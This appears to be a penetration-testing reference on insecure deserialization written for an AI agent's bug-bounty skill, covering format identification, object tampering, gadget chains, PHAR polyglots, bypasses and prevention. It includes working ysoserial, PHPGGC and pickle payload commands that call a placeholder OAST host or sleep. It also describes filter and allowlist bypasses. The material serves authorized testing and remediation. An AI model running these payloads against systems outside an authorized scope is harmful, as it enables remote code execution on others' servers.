# Insecure Deserialization — Deep Reference

Companion to `SKILL.md`. Sources:
- https://portswigger.net/web-security/deserialization
- https://portswigger.net/web-security/deserialization/exploiting
- ysoserial: https://github.com/frohoff/ysoserial
- PHPGGC: https://github.com/ambionics/phpggc
- PHAR background: https://portswigger.net/web-security/deserialization/exploiting#phar-deserialization

All exploitation here must use a **harmless verification action** — an OAST/DNS callback or a `sleep` delay. Never run destructive commands, drop shells, delete/modify files, or exfiltrate data beyond what proves the bug. Re-confirm scope before touching any target (see CLAUDE.md SCOPE GATE).

---

## 1. Serialization formats & how to identify them

### PHP
Human-readable, type-tagged, with explicit lengths. Tamper carefully: string lengths must match.
```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```
- `O:<len>:"<class>":<propcount>:{ ... }` — object
- `s:<len>:"<str>";` — string  (len is byte length)
- `i:<n>;` — integer   `d:<n>;` — float   `b:0|1;` — bool   `N;` — null
- `a:<count>:{<key><val>...}` — array
Often base64- and/or URL-encoded inside a cookie. Private/protected props have NUL-byte-wrapped names (`\0Class\0prop`, `\0*\0prop`).

### Java
Binary stream. Signatures:
- Hex: starts `AC ED 00 05` (magic `0xACED`, version `0x0005`).
- Base64: starts `rO0AB` (commonly `rO0ABX...`).
Found in cookies, hidden fields, params, RMI/JMX, message queues. Class must implement `Serializable`; `readObject()` is the deserialization hook.

### .NET
- **ViewState**: `__VIEWSTATE` (+ `__VIEWSTATEGENERATOR`) base64. Exploitable when MAC is disabled or the machineKey is known/leaked.
- **BinaryFormatter / LosFormatter / NetDataContractSerializer / SoapFormatter**: dangerous when fed untrusted input.
- **Json.NET**: `"$type":"Namespace.Class, Assembly"` in JSON indicates `TypeNameHandling` ≠ `None` → arbitrary type instantiation.

### Python — pickle
Base64 of stack-machine opcodes. Hints: protocol 2+ often base64 `gAS`/`gAJ`; ASCII protocol 0 shows `(dp0`, `(lp0`, `c<module>\n<callable>`; stream ends with `.` (STOP opcode). `__reduce__` controls reconstruction — the classic RCE primitive.

### Ruby — Marshal
Binary beginning `\x04\x08` (Marshal v4.8); base64 `BAh...`. Reachable via `Marshal.load`. Rails cookies historically also exploitable via YAML (`Psych`/`!ruby/object`).

**Probe trick:** flip one byte / break a length prefix and watch for a deserialization stack trace that names the parser — it confirms format and library versions for chain selection.

---

## 2. Modifying serialized objects (tampering)

### PHP example — privilege escalation
Cookie decodes to:
```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```
Flip the bool: `b:0;` → `b:1;`. Re-encode (base64/URL as the app expects), resend. If the app trusts the deserialized `isAdmin`, you're admin.

### PHP type juggling — auth bypass
Vulnerable pattern: `if ($login['password'] == $password)`. Set the serialized password field to integer `0` (`i:0;`). Loose `==` can coerce a non-numeric string to `0` and match. PHP 8 removed `0 == "string"` for pure strings, but numeric-prefixed strings still coerce — test both.

### Java example — field tampering
Pure-data field edits are awkward in the binary stream; in practice you regenerate the object or use a gadget. Where a field is plainly editable (and re-length-correct), flip it; otherwise move to gadget chains (§4).

**Length discipline:** every `s:N:"..."` in PHP must have `N` = exact byte length after edits, or `unserialize()` rejects it.

---

## 3. Magic methods (automatic invocation)

These run *without explicit calls* during/after deserialization — gadget entry points:
- **PHP**: `__wakeup()` (on unserialize), `__destruct()` (on object teardown), `__toString()` (on string context), `__call()`, `__get()`.
- **Java**: `readObject()`, `readResolve()`, `readExternal()`, `finalize()`.
- **Python**: `__reduce__` / `__setstate__` (pickle).
- **.NET**: `OnDeserialized`/`OnDeserializing` callbacks, `IDeserializationCallback`.

A chain typically starts in a magic method (kick-off gadget) and flows to a sink.

---

## 4. Injecting arbitrary objects & gadget chains

**Inject arbitrary objects:** deserialization usually doesn't validate the declared type, so you can supply *any* available serializable class. Pick a class whose magic method does something useful, even if the app never intended to deserialize it.

**Gadget chain anatomy:**
- *Kick-off gadget* — magic method that auto-runs.
- *Intermediate gadgets* — pass attacker-controlled data along.
- *Sink gadget* — dangerous operation (command exec, reflection, file write).
You control only the **data**; all code pre-exists in the app or its dependencies.

### ysoserial (Java) — pre-built chains
```
# Blind detection, works on ANY Java version, no vulnerable lib required:
java -jar ysoserial.jar URLDNS "http://<id>.oast.example" | base64

# Firewalled / blind, time the TCP connect attempt:
java -jar ysoserial.jar JRMPClient "<oast-ip>:1099" | base64

# RCE proof via library gadget (pick chain matching the app's libs), harmless command only:
java -jar ysoserial.jar CommonsCollections6 "nslookup <id>.oast.example" | base64
java -jar ysoserial.jar CommonsBeanutils1 "sleep 10" | base64
```
Place the base64 into the serialized field. Confirm with the OAST DNS hit or a measurable delay. Chain choice depends on classpath (CommonsCollections1-7, Spring1/2, CommonsBeanutils1, Hibernate1, etc.). `URLDNS` first because it has no library dependency.

### PHPGGC (PHP) — pre-built chains
```
phpggc -l                                   # list available chains
phpggc Monolog/RCE1 system "curl http://<id>.oast.example"   # benign callback
phpggc -b Monolog/RCE1 system "sleep 10"    # base64 output, ready for a cookie
phpggc Laravel/RCE9 system "id"             # framework-specific (use harmless cmd)
```
Match the chain to the framework/library version in use (`Monolog`, `Laravel`, `Symfony`, `Guzzle`, `Doctrine`, ...).

### Custom chains (source access)
1. Find a deserialization magic method as the entry point.
2. Trace method invocations toward dangerous operations (exec/reflection/file ops).
3. Map data flow from attacker-controlled attributes to the sink.
4. Serialize an object graph matching the target class structure with your benign payload.

---

## 5. PHAR deserialization (PHP, no explicit unserialize needed)

PHAR archives store serialized metadata in their manifest. PHP **implicitly deserializes** that metadata when a filesystem function operates on a `phar://` path — including functions not normally seen as dangerous: `file_exists()`, `file_get_contents()`, `fopen()`, `is_dir()`, `getimagesize()`, etc.

Exploit when you can (a) upload a file and (b) influence a path passed to such a function:
```
phpggc -p phar -o evil.phar -j Monolog/RCE1 system "curl http://<id>.oast.example"
```
- `-p phar` builds a PHAR; `-j` prepends a valid JPEG header for a **polyglot** that passes image filters.
- Upload as an image, then trigger `phar:///path/to/upload` (e.g. via a thumbnail/preview/`getimagesize` path).
- `__wakeup()`/`__destruct()` in the metadata object kick off the chain. Keep the command a harmless OAST callback.

---

## 6. .NET / Python / Ruby notes

- **.NET ViewState**: if MAC disabled → forge directly. If you obtain the `machineKey` (config leak, default key), sign a malicious ViewState. Tool: **ysoserial.net** (`-g <gadget> -f LosFormatter ...`). `BinaryFormatter` is broadly exploitable; `Json.NET` exploitable when `TypeNameHandling != None`.
- **Python pickle**: a class with `__reduce__` returning `(os.system, ("nslookup <id>.oast.example",))` executes on load. Any endpoint doing `pickle.loads()` (or `pyyaml` `yaml.load` without `SafeLoader`, or `jsonpickle`) on client input is exploitable — prove with OAST/sleep only.
- **Ruby**: `Marshal.load` on untrusted input, or YAML `!ruby/object:` tags via `Psych`/`YAML.load`, enable object injection / RCE. Universal Ruby gadget chains exist for several versions.

---

## 7. Common bypasses

- **ViewState MAC/encryption** — needs disabled MAC or a known machineKey; otherwise not exploitable.
- **Magic-byte / format filters** — base64/URL/double-encode; for PHAR use polyglots to defeat image checks.
- **Class allowlists** — find a permitted class that still reaches a useful gadget.
- **PHP 8 `==` change** — pure-string juggling no longer works; numeric-prefix strings still coerce; fall back to gadget chains.
- **Version-specific chains** — read the stack trace / dependency versions and pick the matching ysoserial/PHPGGC chain.
- **Length prefixes** — recompute PHP `s:N:` and array counts after any edit.

---

## 8. Prevention (for remediation guidance)

- **Do not deserialize untrusted input.** This is the only fully reliable defense.
- If unavoidable: enforce a **strict type/class allowlist**, run with least privilege, and isolate the deserialization process.
- **Integrity-check before deserializing** — sign data with a key the client never sees and verify the signature *before* the byte stream touches the deserializer (validation after deserialization is already too late).
- Avoid generic deserializers for untrusted data: prefer pure-data formats (JSON/Protobuf) with explicit, type-bound parsing. Disable dangerous features (`BinaryFormatter`, `TypeNameHandling`, pickle, `Marshal.load`, `YAML.load`) on client input.
- Keep libraries patched; many gadget chains target known-vulnerable dependency versions.

---

## 9. Harmless-verification reminder

Prove deserialization → execution with the **smallest safe signal**:
- DNS/HTTP OAST callback (`nslookup`/`curl` to your Collaborator/OAST domain), or
- a `sleep`/time-delay you can measure.

That is sufficient to demonstrate RCE for a P1 report. Do **not** run shells, read/write arbitrary files, escalate, pivot, or dump data. Log the decode→tamper→encode→send sequence (or single `curl`) plus OAST evidence to `./_EXPLOIT/`, then stop.
